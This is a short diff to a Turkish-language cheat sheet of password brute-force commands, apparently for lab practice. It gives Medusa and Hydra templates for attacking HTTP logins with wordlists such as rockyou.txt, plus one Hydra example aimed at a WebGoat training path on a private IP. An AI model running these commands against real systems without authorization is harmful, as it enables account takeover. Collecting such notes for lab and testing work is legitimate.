@@ -10,3 +10,10 @@ hydra <target ip> <http metod posty yada get> "<login işleminin gerçekleştiğ
 
 *Medusa
 medusa -h <targetip> -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/test -T 10
+
+
+WEB(Basic-auth):
+
+hydra <target ip> <http metod> "<url uzantısı>" -L <userwordlist> -P " <password list>"
+hydra 192.168.1.10 http-get "WebGoat/attack"  -L user.txt  -P pass.txt
+
